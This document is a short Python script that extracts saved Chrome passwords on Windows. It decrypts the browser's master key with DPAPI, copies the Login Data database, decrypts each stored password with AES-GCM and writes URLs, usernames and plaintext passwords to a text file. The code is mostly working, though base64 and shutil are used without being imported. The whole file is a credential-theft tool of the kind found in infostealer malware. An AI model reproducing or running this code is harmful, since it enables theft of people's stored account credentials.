import os
import json
import sqlite3
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')

chrome_path = appdata + '\\Google\\Chrome\\User Data'

data_queries = {
    'login_data': {
        'query': 'SELECT origin_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    }
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def save_results(type_of_data, content):
    if content is not None:
        open(f'chrome_passwords.txt', 'w', encoding="utf-8").write(content)
        print(f"\t [*] Saved passwords in chrome_passwords.txt")
    else:
        print(f"\t [-] No Data Found!")


def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result


if __name__ == '__main__':
    master_key = get_master_key(chrome_path)
    print(f"Getting Stored Passwords from Google Chrome")

    for data_type_name, data_type in data_queries.items():
        print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
        data = get_data(chrome_path, "Default", master_key, data_type)
        save_results(data_type_name, data)
        print("\t------\n")

input("Press any key to exit...")
